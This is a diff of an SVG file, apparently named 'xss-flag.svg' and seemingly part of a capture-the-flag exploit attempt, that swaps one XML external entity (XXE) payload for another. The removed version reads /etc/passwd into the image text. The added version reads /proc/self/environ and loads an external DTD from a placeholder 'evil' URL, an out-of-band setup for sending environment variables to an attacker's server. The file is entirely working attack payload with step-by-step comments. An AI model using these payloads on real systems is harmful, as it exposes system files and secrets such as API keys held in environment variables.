@@ -1,8 +1,11 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "/etc/passwd"> <!-- Try reading /etc/passwd absolute path -->
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
-  <rect width="1000" height="1000" fill="white"/>
-  <text x="10" y="50" font-size="12" fill="black" style="font-family: monospace;">&xxe;</text>
-</svg> 
+        <!-- xss-flag.svg -->
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE svg [
+            <!ENTITY % file SYSTEM "/proc/self/environ"> <!-- Read environment variables -->
+            <!ENTITY % dtd SYSTEM "RAW_URL_OF_EVIL_DTD"> <!-- Fetch external DTD -->
+            %dtd; <!-- Process external DTD -->
+        ]>
+        <svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
+            <rect width="1000" height="1000" fill="white"/>
+            <text x="10" y="50">Triggering OOB XXE...</text> <!-- Displayed text doesn't matter -->
+        </svg>
